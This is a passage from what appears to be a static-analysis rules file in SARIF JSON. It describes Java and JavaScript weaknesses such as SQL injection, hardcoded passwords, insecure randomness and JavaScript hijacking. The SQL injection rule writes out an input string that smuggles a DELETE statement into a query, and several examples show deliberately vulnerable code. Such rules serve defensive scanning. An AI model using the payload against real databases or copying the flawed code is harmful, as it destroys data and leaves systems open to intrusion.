of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one used in Example 1. If an attacker enters the string \"`name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a`\", the following three valid statements will be created:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\r\n\r\n\tDELETE FROM items;\r\n\r\n\tSELECT * FROM items WHERE 'a'='a';\n`\r\n\r\nSome think that in the mobile world, classic web application vulnerabilities, such as SQL injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.\r\n\r\n**Example 3:** The following code adapts Example 1 to the Android platform.\r\n\r\n`\n...\n        PasswordAuthentication pa = authenticator.getPasswordAuthentication();\n        String userName = pa.getUserName();\n        String itemName = this.getIntent().getExtras().getString(\"itemName\");\n        String query = \"SELECT * FROM items WHERE owner = '\"\n                                + userName + \"' AND itemname = '\"\n                                + itemName + \"'\";\n        SQLiteDatabase db = this.openOrCreateDatabase(\"DB\", MODE_PRIVATE, null);\n        Cursor c = db.rawQuery(query, null);\n...\n`\r\n\r\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\r\n\r\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped meta-characters\n    - Use stored procedures to hide the injected meta-characters\r\n\r\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\r\n\r\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "89",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "1.0",
                "Probability": "5.0"
              }
            },
            {
              "id": "1733FB59-CC13-4E99-9638-3D45FEEE9BE1",
              "guid": "1733FB59-CC13-4E99-9638-3D45FEEE9BE1",
              "name": "Security Features/Cookie Security/HTTPOnly not Set",
              "shortDescription": {
                "text": "The program creates a cookie in {PrimaryLocation.file} at line {PrimaryLocation.line}, but fails to set the `HttpOnly` flag to `true`.\r\nThe program creates a cookie, but fails to set the `HttpOnly` flag to `true`."
              },
              "fullDescription": {
                "text": "All major browsers support the `HttpOnly` cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. When `HttpOnly` is not enabled, attackers may more easily access user cookies.\r\n\r\nIn this case a cookie is set in {PrimaryLocation.file} at line {PrimaryLocation.line}, but the `HttpOnly` parameter is not set or is set to `false`.\r\n\r\n**Example 1:** The code in the example below creates a cookie without setting the `HttpOnly` property.\n`\njavax.servlet.http.Cookie cookie = new javax.servlet.http.Cookie(\"emailCookie\", email);\n// Missing a call to: cookie.setHttpOnly(true);\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "2.0",
                "Probability": "2.0"
              }
            },
            {
              "id": "C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B",
              "guid": "C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B",
              "name": "Security Features/Password Management/Hardcoded Password",
              "shortDescription": {
                "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case a hardcoded password was found in the call to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded password to connect to a database:\r\n\r\n`\n...\nDriverManager.getConnection(url, \"scott\", \"tiger\");\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the `javap -c` command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:\r\n\r\n`\njavap -c ConnMngr.class\r\n\r\n22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc   #38; //String scott\n26: ldc   #17; //String tiger\n`\r\n\r\nIn the mobile world, password management is even trickier, considering a much higher chance of device loss.\n**Example 2:** The code below uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.\n`\n...\nwebview.setWebViewClient(new WebViewClient() {\n  public void onReceivedHttpAuthRequest(WebView view,\n        HttpAuthHandler handler, String host, String realm) {\n    handler.proceed(\"guest\", \"allow\");\n  }\n});\n...\n`\r\n\r\nSimilar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "798",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C",
              "guid": "D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C",
              "name": "Code Quality/Portability Flaw/Locale Dependent Comparison",
              "shortDescription": {
                "text": "The call to {PrimaryTransitionFunction.name}  on line {PrimaryLocation.line} causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.\r\nUnexpected portability problems can be found when the locale is not specified."
              },
              "fullDescription": {
                "text": "When comparing data that may be locale-dependent, an appropriate locale should be specified.\r\n\r\n**Example 1:** The following example tries to perform validation to determine if user input includes a `&lt;script&gt;` tag.\n`\n  ...\n  public String tagProcessor(String tag){\n    if (tag.toUpperCase().equals(\"SCRIPT\")){\n      return null;\n    }\n    //does not contain SCRIPT tag, keep processing input\n    ...\n  }\n  ...\n`\r\n\r\nThe problem with the above code is that `java.lang.String.toUpperCase()` when used without a locale uses the rules of the default locale. Using the Turkish locale `\"title\".toUpperCase()` returns &quot;T\\u0130TLE&quot;, where &quot;\\u0130&quot; is the &quot;LATIN CAPITAL LETTER I WITH DOT ABOVE&quot; character. This can lead to unexpected results, such as in Example 1 where this will prevent the word &quot;script&quot; from being caught by this validation, potentially leading to a Cross-Site Scripting vulnerability."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "474",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "2.5",
                "Probability": "1.0"
              }
            },
            {
              "id": "C3693353-E32E-4B40-964A-94186E0D63B3",
              "guid": "C3693353-E32E-4B40-964A-94186E0D63B3",
              "name": "API Abuse/Missing Check against Null",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} can dereference a null pointer on line {LastTraceLocation.line} because it does not check the return value of {PrimaryCall.name}, which might return null.\r\nThe program can dereference a null pointer because it does not check the return value of a function that might return null."
              },
              "fullDescription": {
                "text": "Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.\r\n\r\nTwo dubious assumptions that are easy to spot in code are \"this function call can never fail\" and \"it doesn't matter if this function call fails\". When a programmer ignores the return value from a function, they implicitly state that they are operating under one of these assumptions.\r\n\r\nIn this case, an earlier return value is used without being checked in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:**  The following code does not check to see if the string returned by `getParameter()` is `null` before calling the member function `compareTo()`, potentially causing a null dereference.\r\n\r\n`\nString itemName = request.getParameter(ITEM_NAME);\n\tif (itemName.compareTo(IMPORTANT_ITEM)) {\n\t\t...\n\t}\n\t...\n`\r\n\r\n**Example 2:**. The following code shows a system property that is set to `null` and later dereferenced by a programmer who mistakenly assumes it will always be defined.\r\n\r\n`\nSystem.clearProperty(\"os.name\");\n...\nString os = System.getProperty(\"os.name\");\nif (os.equalsIgnoreCase(\"Windows 95\") )\n\tSystem.out.println(\"Not supported\");\n`\r\n\r\nThe traditional defense of this coding error is:\r\n\r\n\"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value.\"\r\n\r\nBut attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "253",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "690",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "6652216F-0850-4985-847A-19DF0EF1CAD1",
              "guid": "6652216F-0850-4985-847A-19DF0EF1CAD1",
              "name": "API Abuse/Code Correctness/Incorrect Serializable Method Signature",
              "shortDescription": {
                "text": "The method in {PrimaryLocation.file} at {PrimaryLocation.line} uses a serializable method but with an incorrect signature, so it may never be called during serialization/deserialization.\r\nUsing the incorrect method signature on a method used in serialization may lead to it never being called."
              },
              "fullDescription": {
                "text": "Code Correctness: Incorrect Serializable Method Signature issues occur when a serializable class creates a serialization or deserialization function but does not follow the correct signatures: \r\n\r\n`\n  private void writeObject(java.io.ObjectOutputStream out) throws IOException;\n  private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;\n  private void readObjectNoData() throws ObjectStreamException;\n`\r\n\r\nDeviating from the method signatures that serialization requires may mean that the method is never called during serialization/deserialization, leading to incomplete serialization/deserialization, or could mean that untrusted code could gain access to the objects. \nIn the case that there are exceptions that are not thrown, it may mean that serialization/deserialization fails and crashes the application or potentially even fails quietly such that objects may be only partially constructed correctly, leading to flaws that can be extremely difficult to debug. The caller should catch these exceptions such that incorrect serialization/deserialization can be handled properly without a crash or partially constructed objects."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "9D479AB5-B986-492C-B1F0-C11F2FD623F7",
              "guid": "9D479AB5-B986-492C-B1F0-C11F2FD623F7",
              "name": "Time and State/J2EE Bad Practices/JVM Termination",
              "shortDescription": {
                "text": "The call to {PrimaryCall.name} in {EnclosingFunction.name} at {PrimaryLocation.file} line {PrimaryLocation.line} shuts down the web application container. A web application should not attempt to shut down its container.\r\nA web application should not attempt to shut down its container."
              },
              "fullDescription": {
                "text": "It is never a good idea for a web application to attempt to shut down the application container. A call to a termination method is probably part of leftover debug code or code imported from a non-J2EE application."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "382",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "1F50410E-C148-415D-94A1-38D911C45919",
              "guid": "1F50410E-C148-415D-94A1-38D911C45919",
              "name": "Errors/Poor Error Handling/Throw Inside Finally",
              "shortDescription": {
                "text": "Using a `throw` statement inside a `finally` block breaks the logical progression through the `try-catch-finally`."
              },
              "fullDescription": {
                "text": "In Java, `finally` blocks are always executed after their corresponding `try-catch` blocks and are often used to free allocated resources, such as file handles or database cursors. Throwing an exception in a `finally` block can bypass critical cleanup code since normal program execution will be disrupted.\r\n\r\n**Example 1:** In the following code, the call to `stmt.close()` is bypassed when the `FileNotFoundException` is thrown.\n`\npublic void processTransaction(Connection conn) throws FileNotFoundException\n{\n    FileInputStream fis = null;\n    Statement stmt = null;\n    try\n    {\n        stmt = conn.createStatement();\n        fis = new FileInputStream(\"badFile.txt\");\n        ...\n    }\n    catch (FileNotFoundException fe)\n    {\n        log(\"File not found.\");\n    }\n    catch (SQLException se)\n    {\n        //handle error\n    }\n    finally\n    {\n        if (fis == null)\n        {\n            throw new FileNotFoundException();\n        }\r\n\r\n        if (stmt != null)\n        {\n            try\n            {\n                stmt.close();\n            }\n            catch (SQLException e)\n            {\n                log(e);\n            }\n        }\n    }\n}\n`\r\nThis category is from the Cigital Java Rulepack. http://www.cigital.com/"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "398",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "6F84D4B0-3B7E-4463-A165-76135931D192",
              "guid": "6F84D4B0-3B7E-4463-A165-76135931D192",
              "name": "Code Quality/Dead Code/Unused Method",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} is not reachable from any method outside the class. It is dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.\r\nThis method is not reachable from any method outside the class."
              },
              "fullDescription": {
                "text": "This method is never called or is only called from other dead code.\r\n\r\n**Example 1:** In the following class, the method `doWork()` can never be called.\r\n\r\n`\npublic class Dead {\n  private void doWork() {\n    System.out.println(\"doing work\");\n  }\n  public static void main(String[] args) {\n    System.out.println(\"running Dead\");\n  }\n}\n`\r\n\r\n**Example 2:** In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code.\r\n\r\n`\npublic class DoubleDead {\n  private void doTweedledee() {\n    doTweedledumb();\n  }\n  private void doTweedledumb() {\n    doTweedledee();\n  }\n  public static void main(String[] args) {\n    System.out.println(\"running DoubleDead\");\n  }\n}\n`\r\n\r\n(In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.)"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "561",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "993CC475-24A5-4BBD-A008-67045CCA0ACB",
              "guid": "993CC475-24A5-4BBD-A008-67045CCA0ACB",
              "name": "Code Quality/Code Correctness/Byte Array to String Conversion",
              "shortDescription": {
                "text": "The call to {PrimaryCall.name} on line {PrimaryLocation.line} of {PrimaryLocation.file} converts a byte array into a `String`, which may lead to data loss.\r\nConverting a byte array into a `String` may lead to data loss."
              },
              "fullDescription": {
                "text": "When data from a byte array is converted into a `String`, it is unspecified what will happen to any data that is outside of the applicable character set. This can lead to data being lost, or a decrease in the level of security when binary data is needed to ensure proper security measures are followed.\r\n\r\n**Example 1:** The following code converts data into a String in order to create a hash.\r\n\r\n`\n  ...\n  FileInputStream fis = new FileInputStream(myFile);\n  byte[] byteArr = byte[BUFSIZE];\n  ...\n  int count = fis.read(byteArr);\n  ...\n  String fileString = new String(byteArr);\n  String fileSHA256Hex = DigestUtils.sha256Hex(fileString);\n  // use fileSHA256Hex to validate file \n  ...\n`\r\n\r\nAssuming the size of the file is less than `BUFSIZE`, this works fine as long as the information in `myFile` is encoded the same as the default character set, however if it's using a different encoding, or is a binary file, it will lose information. This in turn will cause the resulting SHA hash to be less reliable, and could mean it's far easier to cause collisions, especially if any data outside of the default character set is represented by the same value, such as a question mark."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "486",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "4EADC9FA-11B0-4C56-A76F-091E8FDC28C1",
              "guid": "4EADC9FA-11B0-4C56-A76F-091E8FDC28C1",
              "name": "Code Quality/Code Correctness/readObject() Invokes Overridable Function",
              "shortDescription": {
                "text": "The `readObject()` method in {PrimaryLocation.file} at line {PrimaryLocation.line} calls a function that may be overridden by an attacker.\r\nThe `readObject()` method within the class calls a function that may be overridden."
              },
              "fullDescription": {
                "text": "During deserialization, `readObject()` acts like a constructor, so object initialization is not complete until this function ends. Therefore when a `readObject()` function of a `Serializable` class calls an overridable function, this may provide the overriding method access to the object's state prior to it being fully initialized.\r\n\r\n**Example 1:** The following `readObject()` function calls a method that can be overridden.\r\n\r\n`\n  ...\n  private void readObject(final ObjectInputStream ois) throws IOException, ClassNotFoundException {\n    checkStream(ois);\n    ois.defaultReadObject();\n  }\r\n\r\n  public void checkStream(ObjectInputStream stream){\n    ...\n  }\n`\r\n\r\nSince the function `checkStream()` and its enclosing class are not `final` and public, it means that the function can be overridden, which may mean that an attacker may override the `checkStream()` function in order to get access to the object during deserialization."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "49D75ADD-4BBD-49B9-AAF2-92B9BAB332FE",
              "guid": "49D75ADD-4BBD-49B9-AAF2-92B9BAB332FE",
              "name": "Security Features/Insecure Randomness",
              "shortDescription": {
                "text": "The random number generator implemented by {PrimaryCall.name} cannot withstand a cryptographic attack.\r\nStandard pseudorandom number generators cannot withstand cryptographic attacks."
              },
              "fullDescription": {
                "text": "Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.\r\n\r\nIn this case the function that generates weak random numbers is <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\nComputers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.\r\n\r\nThere are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.\r\n\r\n**Example:** The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.\r\n\r\n`\nString GenerateReceiptURL(String baseUrl) {\n    Random ranGen = new Random();\n    ranGen.setSeed((new Date()).getTime());\n    return (baseUrl + ranGen.nextInt(400000000) + \".html\");\n}\n`\r\n\r\nThis code uses the `Random.nextInt()` function to generate \"unique\" identifiers for the receipt pages it generates. Since `Random.nextInt()` is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "338",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "4.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "DA3D93EF-F156-436B-BC4B-4BBFB3D1404B",
              "guid": "DA3D93EF-F156-436B-BC4B-4BBFB3D1404B",
              "name": "API Abuse/Unchecked Return Value",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} ignores the value returned by {PrimaryCall.name} on line {PrimaryLocation.line}, which could cause the program to overlook unexpected states and conditions.\r\nIgnoring a method's return value can cause the program to overlook unexpected states and conditions."
              },
              "fullDescription": {
                "text": "It is not uncommon for Java programmers to misunderstand `read()` and related methods that are part of many `java.io` classes. Most errors and unusual events in Java result in an exception being thrown. (This is one of the advantages that Java has over languages like C: Exceptions make it easier for programmers to think about what can go wrong.) But the stream and reader classes do not consider it unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.\r\n\r\nThis behavior makes it important for programmers to examine the return value from `read()` and other IO methods to ensure that they receive the amount of data they expect.\r\n\r\nIn this case the value of <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> is unchecked in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example:** The following code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always exactly 1 kilobyte in size and therefore ignores the return value from `read()`. If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and handle it as though it belongs to the attacker.\r\n\r\n`\nFileInputStream fis;\nbyte[] byteArray = new byte[1024];\nfor (Iterator i=users.iterator(); i.hasNext();) {\n    String userName = (String) i.next();\n    String pFileName = PFILE_ROOT + \"/\" + userName;\n    FileInputStream fis = new FileInputStream(pFileName);\n    fis.read(byteArray); // the file is always 1k bytes\n    fis.close();\n    processPFile(userName, byteArray);\n}\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "252",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "754",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "A79E289A-14D7-4dfd-8E34-F249133A69FE",
              "guid": "A79E289A-14D7-4dfd-8E34-F249133A69FE",
              "name": "Security Features/Password Management/Hardcoded Password",
              "shortDescription": {
                "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case the password was used to access a resource at <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example:** The following code uses a hardcoded password to connect to an application and retrieve address book entries:\r\n\r\n`\n...\nobj = new XMLHttpRequest();\nobj.open('GET','/fetchusers.jsp?id='+form.id.value,'true','scott','tiger');\n...\n`\r\n\r\nThis code will run successfully, but anyone who accesses the containing web page will be able to view the password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "798",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "B8540555-89E7-43D8-A41B-37DBD2417C86",
              "guid": "B8540555-89E7-43D8-A41B-37DBD2417C86",
              "name": "Encapsulation/JavaScript Hijacking/Vulnerable Framework",
              "shortDescription": {
                "text": "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application."
              },
              "fullDescription": {
                "text": "An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.\r\n\r\nWeb browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.\r\n\r\nThe most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.\r\n\r\n**Example 1:** The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.\r\n\r\nThe client requests data from a server and evaluates the result as JSON with the following code:\r\n\r\n`\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n`\r\n\r\nWhen the code runs, it generates an HTTP request that looks like this:\r\n\r\n`\nGET /object.json HTTP/1.1\n...\nHost: www.example.com\nCookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR\n`\r\n\r\n(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)\nThe server responds with an array in JSON format:\r\n\r\n`\nHTTP/1.1 200 OK\nCache-control: private\nContent-Type: text/JavaScript; charset=utf-8\n...\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  